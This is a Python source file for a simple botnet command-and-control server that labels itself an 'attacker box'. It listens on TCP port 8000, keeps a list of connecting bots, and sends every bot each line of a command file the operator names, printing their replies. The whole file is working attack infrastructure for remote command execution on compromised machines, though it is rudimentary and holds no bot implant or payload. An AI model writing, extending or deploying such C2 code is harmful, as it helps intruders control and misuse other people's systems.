from socket import *

class BotHand():

    def startBot(self, accept):
        self.connectionSocket, self.addr = accept
        self.message = self.connectionSocket.recv(1024).decode()
        print(self.message + f" with IP {self.addr[0]}")

    def handle(self, command):
        self.connectionSocket.send(command.encode())
        self.message = self.connectionSocket.recv(1024).decode()
        print(f"Bot IP {self.addr[0]} send: \n" + self.message)

class Server():
    botList = []
    def __init__(self, port = 8000):
        self.serverPort = port        
        self.serverSocket = socket(AF_INET, SOCK_STREAM)
        self.serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.serverSocket.bind(('', self.serverPort))
    
    def Listen(self):
        self.serverSocket.listen(1)

    def AcceptConnection(self):
        try:
            accept = self.serverSocket.accept()
        except TimeoutError:
            pass
        else:
            bot = BotHand()
            bot.startBot(accept)
            self.botList.append(bot) 

    def SendAll(self, command):
        for bot in self.botList:
            bot.handle(command)
    
    def SendFromFile(self, exeFile):
        with open(exeFile, "r") as file:
            for command in file.readlines():
                command = command.strip('\n')
                self.SendAll(command)
    
    def ShutDown(self):
        for bot in self.botList:
            bot.connectionSocket.shutdown(SHUT_RDWR)
            bot.connectionSocket.close()

print("Attacker box listening and awaiting instructions")
TCPserver = Server()
TCPserver.Listen()
TCPserver.AcceptConnection()
TCPserver.serverSocket.settimeout(0.2)

fileName = ""
while fileName != "exit":
    try:
        fileName = input("Please enter a file name: ")
    except KeyboardInterrupt:
        break

    TCPserver.Listen()
    TCPserver.AcceptConnection()
    TCPserver.SendFromFile(fileName)
    
TCPserver.ShutDown()